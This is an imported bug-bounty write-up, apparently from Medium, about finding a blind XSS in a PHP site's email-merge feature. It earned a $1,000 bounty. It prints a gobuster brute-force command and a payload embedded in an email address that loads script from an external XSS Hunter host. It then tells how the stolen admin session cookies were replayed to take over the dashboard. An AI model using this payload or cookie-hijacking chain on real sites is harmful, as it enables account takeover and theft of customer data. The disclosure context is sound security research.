---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-01-05_blind-xss-in-email-field-1000-bounty.md
original_filename: 2023-01-05_blind-xss-in-email-field-1000-bounty.md
title: Blind XSS in Email Field; 1000$ bounty
category: documents
detected_topics:
- xss
- idor
- command-injection
- rate-limit
- api-security
tags:
- imported
- documents
- xss
- idor
- command-injection
- rate-limit
- api-security
language: en
raw_sha256: d425767b3eccb5eb8b229c7f43db63cd37345451761a47cc54aa489869ddd81e
text_sha256: e283dad4ada8e381fe015845304da404a0d3fa3efbcd7442960a99d194ffbe46
ingested_at: '2026-06-28T07:32:17Z'
sensitivity: unknown
redactions_applied: false
---

# Blind XSS in Email Field; 1000$ bounty

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-01-05_blind-xss-in-email-field-1000-bounty.md
- Source Type: markdown
- Detected Topics: xss, idor, command-injection, rate-limit, api-security
- Ingested At: 2026-06-28T07:32:17Z
- Redactions Applied: False
- Raw SHA256: `d425767b3eccb5eb8b229c7f43db63cd37345451761a47cc54aa489869ddd81e`
- Text SHA256: `e283dad4ada8e381fe015845304da404a0d3fa3efbcd7442960a99d194ffbe46`


## Content

---
title: "Blind XSS in Email Field; 1000$ bounty"
url: "https://yaseenzubair.medium.com/blind-xss-in-email-field-1000-bounty-b19b25a23236"
authors: ["Yaseen Zubair"]
bugs: ["Blind XSS"]
bounty: "1,000"
publication_date: "2023-01-05"
added_date: "2023-01-06"
source: "pentester.land/writeups.json"
original_index: 1700
scraped_via: "browseros"
---

# Blind XSS in Email Field; 1000$ bounty

Blind XSS in Email Field; 1000$ bounty
Yaseen Zubair
Follow
3 min read
·
Jan 6, 2023

101

Where there is blind-xss, There always is xsshunter!

I was testing a website that was built on PHP, The website had a limited program where they would pay $500–$1000 for high and critical vulnerabilities only, therefore small issues like username enumeration and other bypasses were out of scope. I started enumerating the website for subdomains using assetfinder, sublist3r and gobuster but did not find anything interesting. Then I tried directory bruteforcing and an /admin path returned the status-code 200.

gobuster dir -u https://redacted.com/ -w /path/to/wordlist.txt -t 50
Press enter or click to view image in full size

When I visited the page, the admin login dashboard appeared, I tried different sort of attacks but all in vain. All I got was that the admin panel was prone to username enumeration. So I shifted my focus and started testing for XSS, for which I use xsshunter which is ;

XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.

So, I came across a feature on the website called, Email-Merge request , where if I had two accounts, I was able to merge them upon admin approval, I tried seeing if “<script>alert(1)</script>”@xyz.com was being accepted or not, and it returned account-not-found error. So I fired up my burp collaborator and copied the address then I crafted my payload as:
“><script src=https://xyz.xss.ht></script>”@subdomain.burpcollaborator.net
I signed up using the above email, and verified my email using the link I received on my collaborator, (Yes we can use burp for temporary emails as well ;-) )after which I initiated an email request and continued my testing, during which I found that session cookies weren’t httpOnly which means, If I get the XSS , I get the session as well.

Get Yaseen Zubair’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

5 minutes later; XSS Hunter did it’s magic and an email came into my inbox, revealing all the current merge requests which is a clear breach of other customer’s data. Along with it , came IP address of the client, as well as their cookies. And My face lit up like :

So I pasted the cookies in my browser; using EditThisCookie extension and I was logged in the admin dashboard. I quickly reported the issue in the next 10 minutes. It was acknowledged immediately and fix was implemented the next day. It was classified as critical by the owner and I was awarded a bounty of $1000, although according to cvss 3.1 it was a high severity vulnerability with a cvss score of 8.1~8.8 but due to the fact that website has insufficient rate-limit protection I was able to convince the team that the chain would result in mass account takeovers with a strong foothold, so they happily classified it as critical.
